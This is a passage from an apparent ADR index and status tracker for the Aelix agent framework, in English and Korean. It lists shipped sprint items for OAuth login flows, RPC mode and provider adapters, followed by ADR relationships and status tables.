| `tests/model_registry/test_model_registry.py` + `test_oauth_modify_models_integration.py` | shipped | 0065 |
| `tests/test_models.py` + `tests/test_models_generated.py` + `tests/test_harness_current_model.py` | shipped | 0064 / 0065 |
| `tests/rpc/test_rpc_mode_set_model.py` + `test_rpc_mode_cycle_model.py` + `test_rpc_mode_get_available_models.py` + `test_w6_regressions_6f.py` (W6 P-170/P-171/P-172/P-182/P-187/P-181/P-179 regression pins) | shipped | 0058 / 0065 / 0066 |
| ADR-0034 amendment — Sprint 6f ModelRegistry runtime + Pi `Model` field shape (5 new fields) | shipped | 0034 |
| ADR-0049 amendment — Sprint 6f 5 new Model field shapes (cost / thinking_level_map / max_tokens / context_window / headers) | shipped | 0049 |

### Sprint 6e sub-table (Phase 4.5 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_ai.oauth.github_copilot` (Copilot device-code grant + `_start_device_flow` + `_poll_for_github_access_token` + `refresh_github_copilot_token` + `_modify_copilot_models`) | shipped | 0059 |
| Copilot `enterpriseUrl` (camelCase, raw user input) preserved in `OAuthCredentials.extra` (P-147) | shipped | 0059 |
| Copilot `proxy-ep` → `Model.base_url` injection via `modify_models` Protocol callback (Sprint 6c P-102 closed) | shipped | 0059 |
| Copilot poll order `fetch → check → sleep` (Pi `github-copilot.ts:188-226`, W4 M1) + `math.ceil` wait interval (P-144) | shipped | 0059 |
| Copilot `is_dataclass(model)` raises `TypeError` on non-dataclass routed model (P-145 / P-146) | shipped | 0059 |
| `aelix_ai.oauth.openai_codex` (Codex PKCE-callback at port 1455 path `/auth/callback` + `_decode_jwt_payload` + `_get_account_id` + `login_openai_codex` + `refresh_openai_codex_token`) | shipped | 0060 |
| Codex persisted `accountId` (Pi camelCase, P-138) + `originator=pi` (P-140) + `id_token` extras preservation (D.2-authorized) | shipped | 0060 |
| RFC 7519 §3 base64url JWT decode (Pi `atob` bug correction, D.2-authorized) | shipped | 0060 |
| Codex `PI_OAUTH_CODEX_CALLBACK_HOST` → shared `PI_OAUTH_CALLBACK_HOST` → `127.0.0.1` env fallback (P-149) | shipped | 0060 |
| `aelix_ai.oauth.auth_storage` 12 cascade methods + reload-and-retry on OAuth refresh failure (P-142) + DEBUG logging (W4 m5) | shipped | 0061 |
| `aelix_ai.oauth._resolve_config.resolve_config_value` (`!cmd` + `${ENV}` expansion, P-141) | shipped | 0061 |
| `AuthStatus` (frozen) + `AuthSource` 6-value Literal + `FallbackResolver` type alias | shipped | 0061 |
| `aelix_ai.oauth._helpers.maybe_await` (single-owner, drains Anthropic/Copilot/Codex duplicates, P-157) | shipped | 0059 / 0060 |
| `aelix_ai.oauth._registry._OAUTH_DEFERRED_PROVIDERS` drained to `{}` (3/3 Pi built-in providers live; n3) | shipped | 0063 |
| `aelix_ai.oauth._registry._PHASE_4_DEFERRED_FEATURES["auth-storage-layered-resolution"]` marked CLOSED | shipped | 0053 / 0061 |
| `src/aelix/__main__.py` `auth login/logout/status/list` subparser (preserves `--mode rpc` back-compat) | shipped | 0062 |
| `aelix auth status <unknown>` → exit 2 + stderr diagnostic (P-152) | shipped | 0062 |
| `aelix auth login` RuntimeError → exit 1 + stderr diagnostic (n1) | shipped | 0062 |
| `tests/pi_parity/test_phase_4_5_strict_superset.py` closure pin (3 live + 0 deferred + 12 cascade methods + `AuthSource` enum + Copilot/Codex constants) | shipped | 0063 |
| `tests/pi_parity/test_phase_4_3_strict_superset.py` strengthening (Sprint 6c closure pin updated: live ∪ deferred = 3 + per-provider `modify_models` attribute) | shipped | 0063 |
| `tests/pi_parity/fixtures/pi_oauth_copilot_codex_734e08e.json` Pi-parity fixture | shipped | 0063 |
| `tests/oauth/test_github_copilot.py` + `test_openai_codex.py` + `test_auth_storage_cascade.py` + `test_resolve_config.py` + `test_copilot_modify_models_integration.py` + `test_types_authstatus.py` | shipped | 0059 / 0060 / 0061 |
| `tests/cli/test_auth_subcommand.py` (subprocess-based CLI regression suite) | shipped | 0062 |
| ADR-0034 amendment — Sprint 6e OAuth catalog complete (3 of 3 Pi providers live) | shipped | 0034 |
| ADR-0053 amendment — Copilot/Codex + cascade carry-forwards marked RESOLVED | shipped | 0053 |

### Sprint 6d sub-table (Phase 4.4 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_coding_agent.rpc._jsonl` (LF-only framing + `JsonlLineReader` + `serialize_json_line` + `attach_jsonl_line_reader`) | shipped | 0056 |
| `aelix_coding_agent.rpc.rpc_types` (29 RpcCommand variants + `RpcSuccessResponse` + `RpcErrorResponse` + `RpcSessionState` 12-field + 9-method UI request + 3-shape UI response) | shipped | 0057 |
| `aelix_coding_agent.rpc.rpc_mode` (9 supported handlers + 20 deferred error stubs + event pipe + SIGTERM/SIGHUP handlers + stdout takeover) | shipped | 0058 |
| `aelix_coding_agent.rpc.rpc_client` (subprocess wrapper + 29-method command surface + `wait_for_idle`/`collect_events`/`prompt_and_wait`) | shipped | 0058 |
| CLI `--mode {interactive,rpc}` flag (`src/aelix/__main__.py`) | shipped | 0058 |
| `AgentHarness` public properties (`pending_message_count` / `session_file` / `session_name` / `steering_mode` / `follow_up_mode`) (P-118) | shipped | 0058 |
| Pi `BashResult` 4/5-key wire shape on `_handle_bash` (P-115 BLOCKING) | shipped | 0058 |
| `_handle_get_state` reads only public harness surface; AST-walk closure pin (P-118) | shipped | 0058 |
| `_handle_new_session` rejects `parent_session` with Sprint-6f deferral envelope (P-117) | shipped | 0058 |
| `_handle_prompt` logs synchronous failures to stderr (P-119 / W4 m2) | shipped | 0058 |
| Parse-path errors always emit `command="parse"` (P-120) | shipped | 0058 |
| `is_streaming` covers every non-idle phase (P-116) | shipped | 0058 |
| `RpcClient.stop()` rejects pending requests with `RpcClientError("rpc", "RPC server stopped")` (W4 M3) | shipped | 0058 |
| `RpcClient` stderr capture capped at 10 MB FIFO (W4 M4) | shipped | 0058 |
| `RpcClient` stale-response logging (W4 m8) | shipped | 0058 |
| `RpcClient` stop wait timeout (5s after SIGKILL, W4 m9) | shipped | 0058 |
| Count drift 28 → 29 / 19 → 20 across docstrings + fixture (W4 M2 / P-121) | shipped | 0058 |
| `command_to_json` wire_key bind (W4 m6 pyright remap) | shipped | 0058 |
| `tests/pi_parity/test_phase_4_4_strict_superset.py` closure pin (P-127 U+2028 round-trip + P-128 per-variant field-set + W4 M5 session_file regression) | shipped | 0058 |
| `tests/rpc/test_w6_regressions.py` W6 regression suite (14 tests pinning BLOCKING + MAJOR finds) | shipped | 0058 |
| ADR-0020 Draft → Accepted (Sprint 6d closure) | shipped | 0020 |
| ADR-0034 amendment — Sprint 6d RPC mode partition (9 of 29 RpcCommand variants live) | shipped | 0034 |

### Sprint 6c sub-table (Phase 4.3 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `aelix_ai.oauth.types` (`OAuthCredentials` + `OAuthPrompt`/`AuthInfo`/`SelectOption`/`SelectPrompt`/`LoginCallbacks` + `OAuthProvider` Protocol) | shipped | 0051 |
| `aelix_ai.oauth._pkce` (`generate_pkce` + base64url helper, RFC 7636) | shipped | 0051 |
| `aelix_ai.oauth._oauth_page` (`oauth_success_html` / `oauth_error_html`) | shipped | 0051 |
| `aelix_ai.oauth._callback_server` (`HTTPServer` daemon thread + asyncio bridge) | shipped | 0051 |
| `aelix_ai.oauth._registry` (`get/register/unregister/reset_oauth_provider`) | shipped | 0051 |
| `aelix_ai.oauth._high_level` (`get_oauth_api_key_from_credentials`) | shipped | 0051 |
| `aelix_ai.oauth.anthropic` (login + refresh + `_AnthropicOAuthProvider` + constants) | shipped | 0052 |
| `providers/anthropic.py` Bearer header injection on `is_oauth_token` (P-94) | shipped | 0052 |
| `login_anthropic` late-manual-input fallback (Pi `anthropic.ts:294-307`, P-93) | shipped | 0052 |
| `CALLBACK_HOST` / `CALLBACK_PORT` / `CALLBACK_PATH` wired into `start_callback_server` (P-98) | shipped | 0052 |
| Scope (+ unknown response fields) preserved in `OAuthCredentials.extra` (W4 m7) | shipped | 0052 |
| `aelix_ai.oauth.auth_storage.AuthStorage` (load/save/get/set/remove/get_oauth_api_key) | shipped | 0053 |
| Atomic write (tmp + fsync + `os.replace`) (W4 M1) | shipped | 0053 |
| `0o700` parent dir + `0o600` file mode (Pi parity) | shipped | 0053 |
| `asyncio.Lock` in-process + `fcntl.flock` cross-process POSIX | shipped | 0053 |
| `fcntl` failure handler broadened to `except BaseException` (W4 M5) | shipped | 0053 |
| `default_auth_path` honors `XDG_CONFIG_HOME` (W4 m9) | shipped | 0053 |
| `OAuthCredentials.from_json` raises clear `ValueError` (W4 m1) | shipped | 0051 |
| `start_callback_server` friendly `RuntimeError` on port-in-use (W4 m8) | shipped | 0051 |
| `asyncio.get_event_loop()` → `asyncio.get_running_loop()` (W4 m3 / W5 P-99) | shipped | 0051 |
| `BaseHTTPRequestHandler.log_message` override matches base signature (W4 m4) | shipped | 0051 |
| ADR-0035 amendment — `"auth"` fires only on SDK 401/403 (not eager OAuth detection) | shipped | 0035 |
| ADR-0034 amendment — Sprint 6c OAuth partition (1 of 3 OAuth providers live) | shipped | 0034 |
| RPC mode formal carry-forward (`_PHASE_4_DEFERRED_FEATURES["rpc-mode"]`) | shipped | 0054 |
| AuthStorage layered-cascade carry-forward (`_PHASE_4_DEFERRED_FEATURES["auth-storage-layered-resolution"]`) | shipped | 0053 / 0055 |
| Sprint 6a regression `test_sdk_401_translates_to_harness_auth_error` (W4 M3) | shipped | 0055 |
| Sprint 6c W6 regression suite (P-94 bearer header + P-103 OAuth refresh failure E2E) | shipped | 0055 |
| Closure pin strengthening (P-100 live ∪ deferred == 3 sum + P-95 cascade carry) | shipped | 0055 |
| `tests/pi_parity/test_phase_4_3_strict_superset.py` closure pin (1 of 3 OAuth providers live + 2 deferred) | shipped | 0055 |

### Sprint 6b sub-table (Phase 4.2 closure)

| Item | Status | Owner ADR |
|---|---|---|
| `_env_api_keys.py` (30-row provider→envvar table) | shipped | 0047 / 0048 |
| `_sanitize_unicode.py` (`sanitize_surrogates`) | shipped | 0048 |
| `_streaming_json.py` (`parse_streaming_json` lenient) | shipped | 0048 |
| `_openai_client.py` (`openai>=1.50,<2.0` SDK wrapper) | shipped | 0047 |
| `_openai_compat.py` (17-field dataclass + `detect_compat` + `get_compat` with camelCase alias accept) | shipped | 0047 |
| `_transform_messages.py` (shared cross-provider infra) | shipped | 0048 |
| `openai_completions.py` (main adapter, 2 of 9 KnownApi) | shipped | 0047 |
| `aelix_ai.models.clamp_thinking_level` (Sprint 6d full map deferred) | shipped | 0047 / 0050 |
| `ThinkingContent` dataclass + provenance trio + `ImageContent.mime_type/data` + `ToolResultMessage.tool_name` | shipped | 0049 |
| `_map_stop_reason` returns Pi `"toolUse"` (P-57) | shipped | 0050 |
| `_open_stream` uses `with_raw_response.create(**params)` (C-1) | shipped | 0050 |
| `_normalize_tool_call_id` 40-char clamp for every provider (M-6) | shipped | 0050 |
| `stream_simple_openai_completions` sync factory + eager auth raise (P-62) | shipped | 0050 |
| `convert_tools` drops Anthropic `input_schema` leak (P-63) | shipped | 0050 |
| Qwen / qwen-chat-template → `COMPAT_DEFERRED_ALLOWLIST` (M-2) | shipped | 0050 |
| W0 fixture `minimax` / `minimax-cn` rows (P-79) | shipped | 0050 |
| `tests/pi_parity/test_phase_4_2_strict_superset.py` closure pin + parametrized behavior assertions (P-76) | shipped | 0050 |
| `tests/providers/test_w6_regressions.py` regression suite | shipped | 0050 |
| ADR-0034 amendment (2 of 9 KnownApi cardinality note) | shipped | 0034 |
| ADR-0045 amendment §F.2 (Anthropic retrofit deferred) | shipped | 0045 |

### Sprint 6a sub-table (Phase 4.1 closure)

| Item | Status | Owner ADR |
|---|---|---|
| 12 `AssistantMessageEvent` variants (8 new + rename + alias + 2 backfills + P-39d spelling fix) | shipped | 0037 |
| `Provider` Protocol + `register_provider_object` + `unregister_providers_by_source` | shipped | 0045 |
| `SimpleStreamOptions` extensions (cache_retention / transport / timeout_ms / max_retries / max_retry_delay_ms / on_payload / on_response / reasoning / session_id / client) | shipped | 0045 |
| `ProviderResponse` dataclass | shipped | 0045 |
| Anthropic adapter (`aelix_ai.providers.anthropic` + `register_all()` under `aelix-ai.builtin` source_id) | shipped | 0045 |
| `_apply_stream_options_patch` deep-merge port (P-41 fix) | shipped | 0046 |
| `_make_stream_fn` closure + 3 emit-site method bridges (`before_provider_request` / `before_provider_payload` / `after_provider_response`) | shipped | 0046 |
| `AgentHarnessError` widened to 10 codes (`"auth"` Sprint 6a + `"session"`/`"branch_summary"`/`"aborted"` Literal cleanup) | shipped | 0035 |
| ADR-0034 repo slug correction (`badlogic/pi-mono` → `earendil-works/pi`) | shipped | 0034 |
| ADR-0037 / 0038 / 0035 Draft → Accepted | shipped | 0037 / 0038 / 0035 |
| `tests/pi_parity/test_phase_4_strict_superset.py` closure pin | shipped | 0046 |
| DEFERRED_ALLOWLIST closed to `{}` (Phase 2.1 → Phase 4.1 strict superset complete) | shipped | 0046 |

> **번호 공백 (0016)**: ADR-0016 "Phase machine expansion"은 ADR-0023(Compaction + Branch Summary)으로 supersede됩니다. 번호를 재사용하지 않고 gap으로 보존합니다.

## Relationships

```text
0001 (Aelix name)
  └─ 0006 narrows ADR-0001 Consequences (DeepSight 양가절 제거)

0002 (Small kernel → Pi pi-agent-core boundary)
  └─ 0004 reinforces (policy/guardrail은 core 밖, built-in extension)

0003 (pi agent reference + Pi Parity Binding Rule)
  ├─ 0004 implements ADR-0003의 "built-in extension" 약속
  ├─ 0005 reflects pi agent의 multi-source(npm/git) marketplace 흐름
  ├─ 0029 mechanizes — Pi parity test harness로 수동 audit 보강
  └─ 모든 ADR의 상위 원칙: ADR 없는 divergence는 버그

0006 (Standalone platform)
  └─ defines 1st-class 청중: 외부 개발자 + 사내 + customer-site

0009 (Python-first SDK — Phase 1.2 SDK choice)
  └─ 0020 supersedes (partial) — RPC mode Phase 4로 다언어 클라이언트 구체화

0011 (Hook event catalogue v1 — Phase 1.2 임시 결정)
  ├─ 0013 specializes — message_end result type None으로 pin
  ├─ 0014 depends — mutation vs observational 분류가 error policy 기반
  └─ 0017 supersedes — Full Hook Event Catalogue v2 (Phase 2.1)

0013 (message_end observational — Phase 1.2 임시 결정)
  └─ 0018 supersedes — replacement reducer with role preservation (Phase 2.1)

0014 (Hook error policy — Phase 1.2 임시 결정)
  └─ 0019 supersedes — Pi "continue" default + per-handler opt-in (Phase 2.1)

0015 (Accepted — Monorepo layout — uv workspaces)
  ├─ 0020 depends — aelix-rpc는 packages/aelix-rpc/ 패키지
  ├─ 0022 depends — session/ 모듈은 packages/aelix-agent-core/ 위치
  ├─ 0023 depends — compaction.py는 packages/aelix-agent-core/ 위치
  └─ 0031 implements — hatchling은 uv workspace per-package backend

0016 (deferred Phase machine)
  └─ 0023 supersedes — Compaction + Branch Summary (Phase 2.2)

0017 (Full Hook Event Catalogue v2)
  ├─ 0018 depends — message_end result type 변경은 v2 catalogue와 함께
  ├─ 0023 adds emit sites — session_before_compact 등 emit site 추가
  ├─ 0027 depends — asyncio.gather는 ADR-0021 impl (P-7 reversal, Sprint 3c); ADR-0017 tool setters와 연동
  └─ 0030 depends — assert_never는 ADR-0017 28-event 확장 시 적용

0021 (Parallel tool execution)
  └─ 0027 specifies — asyncio.TaskGroup을 Phase 2.1 구현 방식으로 결정

0022 (Session Manager)
  ├─ 0023 depends — compaction/branch_summary는 Session interface에 의존
  └─ 0025 extends — sessionId/messages는 ADR-0022 land 시 _TurnState 추가

0024 (Queue default one-at-a-time)
  └─ 즉시 적용 fix — 재평가 보고서 F-1 해소

0025 (F-10 minimal _TurnState)
  ├─ 0017 ← extends (tools/activeTools/streamOptions/resources/thinkingLevel)
  └─ 0022 ← extends (messages/sessionId)

0029 (Pi parity acceptance test harness)
  ├─ 0026 depends — workspace-root tests/가 tests/pi_parity/ 홈
  └─ 0032 supports — W5 Pi parity audit의 기계화

0032 (Sprint workflow — mandatory gates)
  └─ 0029 mechanizes W5 — parity test harness가 성숙하면 W5 scope 축소 가능

0034 (Pi reference version pin)
  ├─ 0003 refines — pi agent primary reference에 SHA pin 추가
  └─ 0029 supports — Pi parity test harness가 pin SHA에 anchored

0035 (Error code taxonomy)
  ├─ 0017 owns "aborted" wiring (Phase 2.1)
  ├─ 0022 owns "session" wiring (Phase 2.2)
  ├─ 0023 owns "compaction" / "branch_summary" wiring (Phase 2.2)
  ├─ 0025 follows — minimal-shell pattern (문서 먼저, code on demand)
  └─ 0030 depends — assert_never가 10-code 전체에 적용

0036 (Loop AgentEvent vs Harness HookEvent — F-7)
  ├─ 0011 amends — 16 hook events는 HookEvent union 소속임을 명시
  ├─ 0017 cross-references — Phase 2.1 28-event 확장은 HookEvent에만 적용
  ├─ 0029 splits parity tests — loop vs harness 별도 lane
  └─ 0030 doubles scope — 두 union 각각 exhaustiveness 적용

0037 (Streaming event union — Pi parity)
  ├─ 0025 follows — minimal-shell pattern (documentation 먼저)
  ├─ 0030 depends — Phase 4 expanded union에 assert_never 적용
  └─ 0038 paired — Phase 4 adapters가 12-event union emit

0038 (stream_simple dispatch shell — Phase 1 boundary)
  ├─ 0017 enables — Phase 2.x `before_provider_request` 가 dispatch 사용 가능
  ├─ 0020 paired — Phase 4 provider work / RPC mode와 함께 land
  ├─ 0025 sibling — 동일 minimal-shell + owning-ADR cadence
  └─ 0037 paired — Phase 4 adapters가 expanded event union emit

0039 (Phase 2.1 strict superset closure)
  ├─ 0017 closes — `tool_execution_update` + tool-result `message_start/end` emit sites landed (Sprint 3d / P-9)
  ├─ 0021 closes — §E matrix rows 3 + 6 implemented in same sprint
  ├─ 0029 mechanizes — E.5 closure pin (`tests/pi_parity/test_phase_2_1_strict_superset.py`) is the durable regression guard
  ├─ 0034 anchors — fixture pinned to SHA `734e08e`
  ├─ 0022 forward — `session_*` events deferred to Phase 2.2 emit owner
  ├─ 0023 forward — `session_before_compact` / `session_compact` / `session_before_tree` / `session_tree` deferred owner
  └─ 0038 forward — `before_provider_request` / `before_provider_payload` / `after_provider_response` deferred to Phase 4 provider adapter
```

## Open Questions (pending ADRs)

`../02-initial-requirements.md` 열린 질문 5개 중 현재 상태.

| Q   | 질문                                                                  | 상태                                                                                                |
| --- | --------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| Q1  | Extension isolation: process / container / remote — 무엇이 기본?      | 결정됨 — in-process 고정, isolation은 protocol에 두지 않음 (ADR-0007).                              |
| Q2  | Marketplace pack signing과 trust chain 형식?                          | 결정됨 — source-책임 그대로, 1차 통합 schema 도입 안 함 (ADR-0010).                                  |
| Q3  | Aelix SDK는 Python-only로 시작 vs 다언어 manifest contract 우선?      | 결정됨 — Python-first SDK (ADR-0009). 다언어 외부 클라이언트는 Phase 4 RPC mode (ADR-0020 Draft).   |
| Q4  | Agent orchestration: runtime core vs extension layer?                 | 결정됨 — 단일 agent loop는 core, multi-agent orchestration은 extension layer (ADR-0008).             |
| Q5  | DeepSight 통합: product integration vs extension pack?                | 결정됨 — Mode A Product Integration. DeepSight는 use case 중 하나 (ADR-0006).                       |

Phase 1.2 sprint spec Section F의 후속 ADR 상태.

| Proposed ADR | 상태                                                                                                                              |
| ------------ | --------------------------------------------------------------------------------------------------------------------------------- |
| ADR-0011 Hook event catalogue v1        | 결정됨 (ADR-0011) → **Phase 1.2 임시 결정으로 강등**. Phase 2.1에 ADR-0017로 대체 예정.              |
| ADR-0012 Extension discovery model      | 보류 → Phase 3에서 ADR-0028로 부분 해소. entry_points primary + directory fallback 결정.             |
| ADR-0013 message_end reducer policy     | 결정됨 (ADR-0013) → **Phase 1.2 임시 결정으로 강등**. Phase 2.1에 ADR-0018로 대체 예정.              |
| ADR-0014 Hook error policy              | 결정됨 (ADR-0014) → **Phase 1.2 임시 결정으로 강등**. Phase 2.1에 ADR-0019로 대체 예정.              |
| ADR-0015 ExtensionContext UI surface    | **번호 재배정** — ADR-0015는 Monorepo Layout (uv workspaces)로 사용 **(Accepted)**. UI surface는 ADR-0033 (Phase 5). |
| ADR-0016 Phase machine expansion        | **ADR-0023로 supersede** — Compaction + Branch Summary (Phase 2.2).                                   |

Sprint 2 ADRs 상태.

| ADR   | 제목                                                        | Status                        |
| ----- | ----------------------------------------------------------- | ----------------------------- |
| 0015  | Monorepo Layout — uv Workspaces                             | Accepted (Phase 1.3 shipped)  |
| 0025  | F-10 Minimal Turn-State Snapshot Rationale                  | Accepted (Phase 1.3 shipped)  |
| 0026  | Workspace-Root Pytest Layout                                | Accepted (Sprint 2 shipped)   |
| 0027  | asyncio.TaskGroup for Parallel Tool Execution               | Accepted (Sprint 3c / Phase 2.1.3 shipped — DECISION REVERSED to asyncio.gather) |
| 0028  | Extension Auto-Discovery via entry_points                   | Draft (Phase 3)               |
| 0029  | Pi-Parity Acceptance Test Harness                           | Draft (Phase 2.1+)            |
| 0030  | Hook Event Exhaustiveness via assert_never                  | Draft (Phase 2.1)             |
| 0031  | Build Backend Choice — Hatchling                            | Accepted (Sprint 2 shipped)   |
| 0032  | Sprint Workflow — Review + Pi Parity + Suggestions          | Accepted (Sprint 2 onwards)   |

Sprint 2.5 ADRs 상태 (Phase 1.4 hygiene).

| ADR   | 제목                                                                 | Status                                                                |
| ----- | -------------------------------------------------------------------- | --------------------------------------------------------------------- |
| 0034  | Pi Reference Version Pin                                             | Accepted (Sprint 2.5 shipped)                                         |
| 0035  | Error Code Taxonomy                                                  | Draft (Phase 1.4 shipped — Aelix subset; full taxonomy Phase 2.1+)    |
| 0036  | Loop AgentEvent vs Harness HookEvent Distinction (F-7)               | Accepted (Sprint 3a — code-land: AgentEventName + AgentHarnessEventName aliases) |
| 0037  | Streaming Event Union (Pi Parity)                                    | Draft (Phase 1.4 shell; adapter coverage Phase 4)                     |
| 0038  | stream_simple Dispatch Shell — Phase 1 Boundary                      | Accepted (Sprint 2.5 / Phase 1.4 shipped — body lands Phase 4)        |

Sprint 3a ADRs 상태 (Phase 2.1.1 hook bus expansion).

| ADR   | 제목                                                                 | Status                                                                |
| ----- | -------------------------------------------------------------------- | --------------------------------------------------------------------- |
| 0017  | Full Hook Event Catalogue v2 (28 events)                             | Accepted (Sprint 3a / Phase 2.1.1 shipped — Pi-verified)              |
| 0019  | Hook Error Policy v2 — Pi `"throw"` Default + Aelix `"continue"` Opt-in | Accepted (Sprint 3a / Phase 2.1.1 shipped — v3 reframe)            |
| 0030  | Hook Event Exhaustiveness via assert_never                            | Accepted (Sprint 3a / Phase 2.1.1 shipped)                            |
| 0036  | Loop AgentEvent vs Harness HookEvent Distinction (F-7) — code-land    | Accepted (Sprint 3a — AgentEventName + AgentHarnessEventName aliases) |

Sprint 3b ADRs 상태 (Phase 2.1.2 — setters + nextTurn/appendMessage + pendingSessionWrites).

| ADR   | 제목                                                                 | Sprint 3a Status                       | Sprint 3b Status                                                                                          |
| ----- | -------------------------------------------------------------------- | -------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| 0013  | message_end Reducer Policy — Observational in Phase 1.2              | Accepted (Phase 1.2 임시 결정)         | Accepted (Phase 1.2 임시 결정 — Sprint 3b 재확정: message_end는 영구 observational)                          |
| 0017  | Full Hook Event Catalogue v2                                         | Accepted (Sprint 3a)                   | Accepted (+ §"Setter emit sites landed Sprint 3b" — P-4 correction: setters don't emit `queue_update`)     |
| 0018  | message_end Replacement Reducer                                      | Draft (Phase 2.1)                      | **Deprecated** — Pi has no message_end reducer at SHA 734e08e (Sprint 3b §0 verdict)                       |
| 0036  | Loop AgentEvent vs Harness HookEvent Distinction (F-7)               | Accepted (Sprint 3a)                   | Accepted (unchanged)                                                                                       |

Sprint 3c ADRs 상태 (Phase 2.1.3 parallel tool execution).

| ADR   | 제목                                                      | Status                                                                  |
| ----- | --------------------------------------------------------- | ----------------------------------------------------------------------- |
| 0017  | Full Hook Event Catalogue v2 (Sprint 3c subsection added) | Accepted (Sprint 3c — Tool execution dispatch subsection added)         |
| 0021  | Parallel-Mode Tool Execution + Per-Tool Override          | Accepted (Sprint 3c / Phase 2.1.3 shipped)                              |
| 0027  | asyncio.gather for Parallel Tool Execution (P-7 reversal) | Accepted (Sprint 3c / Phase 2.1.3 shipped — DECISION REVERSED)          |

Sprint 3d ADRs 상태 (Phase 2.1.4 — Phase 2.1 strict-superset closure / P-9).

| ADR   | 제목                                                                  | Status                                                                  |
| ----- | --------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| 0017  | Full Hook Event Catalogue v2 (Sprint 3d subsection added)             | Accepted (Sprint 3d — `tool_execution_update` + tool-result message emit sites landed) |
| 0021  | Parallel-Mode Tool Execution (§E matrix rows 3 + 6 implemented)       | Accepted (Sprint 3d / Phase 2.1.4 — partial-emit drain + `_emit_tool_result_message`) |
| 0039  | Phase 2.1 Strict Superset Closure                                     | Accepted (Sprint 3d / Phase 2.1.4 shipped — P-1..P-9 roster + E.5 closure pin) |

Sprint 4a ADRs 상태 (Phase 2.2.1 Session Manager + JsonlSessionRepo).

| ADR   | 제목                                                              | Status                                                                |
| ----- | ----------------------------------------------------------------- | --------------------------------------------------------------------- |
| 0017  | Session message_end wiring subsection added                       | Accepted (Sprint 4a — append-then-emit Pi parity)                     |
| 0022  | Session Manager + JSONL Persistence                               | Accepted (Sprint 4a / Phase 2.2.1 shipped — major revision per P-11/P-12/P-13) |
| 0025  | F-10 Minimal Turn-State Snapshot — Sprint 4b extension note added | Accepted (Sprint 4b — _TurnState.messages + session_id shipped)       |
| 0039  | Phase 2.1 Strict Superset Closure — P-11 lockdown added           | Accepted (no Phase 2.1 regression)                                    |

Sprint 4b ADRs 상태 (Phase 2.2.2 compact + navigate + Phase machine + 4 session emits).

| ADR   | 제목                                                              | Status                                                                |
| ----- | ----------------------------------------------------------------- | --------------------------------------------------------------------- |
| 0017  | Session emit sites + payload extensions subsection added          | Accepted (Sprint 4b — P-17/P-18/P-19/P-20 payload extensions)         |
| 0022  | Sprint 4a → 4b transition plan marker → Completed                 | Accepted (4b deferred items all shipped)                              |
| 0023  | Compaction + Branch Summary                                       | Accepted (Sprint 4b / Phase 2.2.2 shipped — P-14/P-15/P-16 verified)  |
| 0025  | F-10 Minimal Turn-State — messages/session_id extension shipped   | Accepted (Sprint 4b — _TurnState fields populated)                    |
| 0039  | Phase 2.1 closure — DEFERRED_ALLOWLIST trimmed                    | Accepted (4 session_* removed; ADR-0040 supersedes Phase 2.2 tracking)|
| 0040  | Phase 2.2 Strict Superset Closure                                 | Accepted (Sprint 4b / Phase 2.2.2 shipped — closure)                  |

Sprint 5a ADRs 상태 (Phase 3.1.1 Extension auto-discovery + ExtensionAPI full surface + 3 event registration).

| ADR   | 제목                                                                              | Status                                                                              |
| ----- | --------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| 0017  | Phase 3.1 event additions subsection added (input/user_bash/resources_discover)   | Accepted (Sprint 5a — 28 → 31 events; P-24/P-25/P-26 closure)                       |
| 0019  | error_mode overload extends to 3 new Sprint 5a events                             | Accepted (Sprint 5a — no v3 change, surface extension)                              |
| 0028  | Extension Auto-Discovery — P-21 REVERSAL (directory-scan PRIMARY)                 | **Accepted (Sprint 5a / Phase 3.1.1 — Draft → Accepted with corrected framing)**    |
| 0033  | ExtensionContext UI surface — `ui` field exposed as deferred-raise (Phase 5)      | Deferred (Phase 5) — Sprint 5a placeholder attribute landed                         |
| 0039  | Phase 2.1 closure — DEFERRED_ALLOWLIST extended with 3 Sprint 5a events           | Accepted (3 entries added with ADR-0042 owner)                                      |
| 0041  | **Phase 3.1 Extension API Full Surface Closure**                                  | **Accepted (Sprint 5a / Phase 3.1.1 shipped — P-21~P-28 roster + closure pin)**     |

Draft ADR 및 target Phase 요약 (전체).

| ADR   | 제목                                       | Target Phase |
| ----- | ------------------------------------------ | ------------ |
| 0029  | Pi-Parity Acceptance Test Harness          | Phase 2.1+ (foundation shipped Sprint 3a) |
| 0033  | ExtensionContext UI surface                | Phase 5 (Sprint 5a exposes attribute as deferred-raise) |
| 0035  | Error Code Taxonomy (Literal widening)     | Per owning ADR (0017 done; 0022 / 0023 / Phase 4) |
| 0037  | Streaming Event Union — adapter coverage   | Phase 4      |

Open question이 ADR로 정리되면 이 표를 함께 갱신합니다.
